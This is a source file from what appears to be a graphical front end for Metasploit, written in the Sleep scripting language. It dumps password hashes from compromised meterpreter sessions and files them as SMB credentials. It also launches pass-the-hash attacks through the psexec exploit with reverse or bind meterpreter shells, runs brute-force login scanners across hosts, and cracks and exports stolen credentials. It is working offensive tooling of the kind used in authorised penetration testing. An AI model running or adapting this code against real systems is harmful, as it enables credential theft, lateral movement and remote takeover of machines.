#
# pass the hash attack gets its own file.
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;

%handlers["hashdump"] = {
	this('$host @commands $safe $last');

	if ($0 eq "begin" && "*Unknown command*hashdump*" iswm $2) {
		$host = $null;

		if ($safe is $null) {
			$safe = 1;
			m_cmd($1, "use priv");
			m_cmd($1, "hashdump");
		}
		else {
			showError("hashdump is not available here");
			$safe = $null;
		}
	}
	else if ($0 eq "execute") {
		$host = sessionToHost($1);
		elog("dumped hashes on $host");
		showError("Hashes dumped.\nUse View -> Credentials to see them.");
		@commands = @();
	}
	else if ($0 eq "update" && $host !is $null && $2 ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
		local('$user $gid $hash');
		($user, $gid, $hash) = matched();

		# strip any funky characters that will cause this call to throw an exception
		$user = replace($user, '\P{Graph}', "");

		push(@commands, "creds -a $host -p 445 -t smb_hash -u $user -P $hash");
	}
	else if ($0 eq "end" && ("*Error running*" iswm $2 || "*Operation failed*" iswm $2)) {
		showError("Hash dump failed. Ask yourself:\n\n1) Do I have system privileges?\n\nNo? Then use Access -> Escalate Privileges\n\n2) Is meterpreter running in a process owned\nby a System user?\n\nNo? Use Explore -> Show Processes and migrate\nto a process owned by a System user.");
		$host = $null;
	}
	else if ($0 eq "end" && $host !is $null) {
		local('@c');
		@c = copy(@commands);
		@commands = @();

		cmd_all_async($client, $console, copy(@c), {}); 
	}
};

sub refreshCredsTable {
	thread(lambda({
		[Thread yield];
		local('$creds $cred');
		[$model clear: 128];
		$creds = call($mclient, "db.creds2", [new HashMap])["creds2"];
		foreach $cred ($creds) {
			[$model addEntry: $cred];
		}
		[$model fireListeners];
	}, $model => $1));
}

sub show_hashes {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain');	

	$dialog = dialog($1, 480, $2);

        $model = [new GenericTableModel: @("user", "pass", "host"), "user", 128];
 	
        $table = [new JTable: $model];
        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$sorter setComparator: 2, &compareHosts];
        [$table setRowSorter: $sorter];

	refreshCredsTable($model);

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	return @($dialog, $table, $model);
}

sub createCredentialsTab {
	local('$dialog $table $model $panel $export $crack $refresh');
	($dialog, $table, $model) = show_hashes("", 320);
	[$dialog removeAll];

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];
	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		refreshCredsTable($model, $null);
	}, \$model)];

	$crack = [new JButton: "Crack Passwords"];
	[$crack addActionListener: {
		thread({
			launch_dialog("Crack Passwords", "auxiliary", "analyze/jtr_crack_fast", 1);
		});
	}];

	$export = [new JButton: "Export"];
	[$export addActionListener: {
		local('$file');
		$file = iff($REMOTE, ask("Where should I save the file?"), saveFile2());
		if ($file !is $null) {
			$file = strrep($file, '\\', '\\\\');
			cmd_safe("db_export -f pwdump -a $file", lambda({
				showError("Exported credentials to:\n $+ $file");

				if ($mclient !is $client) {
					downloadFile($file);
				}
			}, \$file));
		}
	}];

	[$panel add: center($refresh, $crack, $export), [BorderLayout SOUTH]];
	[$frame addTab: "Credentials", $panel, $null];
}

sub pass_the_hash {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');	

	($dialog, $table, $model) = show_hashes("Pass the Hash", 360);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	#[$bottom setLayout: [new GridLayout: 4, 1]];
	[$bottom setLayout: [new BoxLayout: $bottom, [BoxLayout Y_AXIS]]];

	$user = [new JTextField: 32];
	$pass = [new JTextField: 32];
	$domain = [new JTextField: 32];
	[$domain setText: "WORKGROUP"];
	$brute = [new JCheckBox: "Check all credentials"];

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	$reverse = [new JCheckBox: "Use reverse connection"];

	@controls = @($user, $pass, $reverse);

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: label_for("Domain", 75, $domain)];
	[$bottom add: left($brute)];
	[$bottom add: left($reverse)];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["SMBDomain"] = [$domain getText];
		
		if ([$brute isSelected]) {
			%options["RHOSTS"] = join(", ", $hosts);
			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]), "smb_hash");
			elog("brute force smb @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/smb/smb_login", %options, "brute smb");
		}
		else {
			%options["SMBUser"] = [$user getText];
			%options["SMBPass"] = [$pass getText];

			if ([$reverse isSelected]) {
				%options["LHOST"] = $MY_ADDRESS;
				%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
			}	
			else {
				%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
			}
			%options["LPORT"] = randomPort();

			foreach $host ($hosts) {
				%options["RHOST"] = $host;
				module_execute("exploit", "windows/smb/psexec", copy(%options));
			}
			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
		}
		[$dialog setVisible: 0];
	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}


sub show_login_dialog {
	local('$port $srvc');
	($port, $srvc) = values($service, @("port", "name"));

	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');

	($dialog, $table, $model) = show_hashes("login", 320);
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	[$bottom setLayout: [new GridLayout: 3, 1]];

	$user = [new JTextField: 32];
	$pass = [new JTextField: 32];
	$brute = [new JCheckBox: "Check all credentials"];
	@controls = @($user, $pass);

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: $brute];

	[$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["RHOSTS"] = join(', ', $hosts);
		%options["RPORT"] = $port;
		if ([$brute isSelected]) {
			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]));
			elog("brute force $srvc @ " . %options["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options, "brute $srvc");
		}
		else {
			%options["USERNAME"] = [$user getText];
			%options["PASSWORD"] = [$pass getText];
			%options["BLANK_PASSWORDS"] = "false";
			%options["USER_AS_PASS"] = "false";
			warn("$srvc $+ : $port => " . %options);
			elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
			module_execute("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
		}
		[$dialog setVisible: 0];
	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port, \$brute, \$model)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}

sub createUserPassFile {
	local('$handle $user $pass $type $row $2');
	$handle = openf(">userpass.txt");
	foreach $row ($1) {
		($user, $pass, $type) = values($row, @("user", "pass", "type"));
		if ($type eq "password" || $type eq $2) {
			println($handle, "$user $pass");
		}
		else {
			println($handle, "$user");
		}
	}	
	closef($handle);

	if ($client !is $mclient) {
		local('$file');
		$file = uploadFile("userpass.txt");
		deleteFile("userpass.txt");
		return $file;
	}
	else {
		return getFileProper("userpass.txt");
	}
}

# launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
sub launchBruteForce {
	thread(lambda({ 
		local('$console $key $value');
		$console = createConsoleTab("$title", 1, $host => "all", $file => "brute_login");
		[$console sendString: "use $type $+ / $+ $module $+ \n"];
		foreach $key => $value ($options) {
			$value = strrep($value, '\\', '\\\\');
			[$console sendString: "set $key $value $+ \n"];
		}
		[$console sendString: "set REMOVE_USERPASS_FILE true\n"];
		[$console sendString: "run -j\n"];
	}, $type => $1, $module => $2, $options => $3, $title => $4));
}
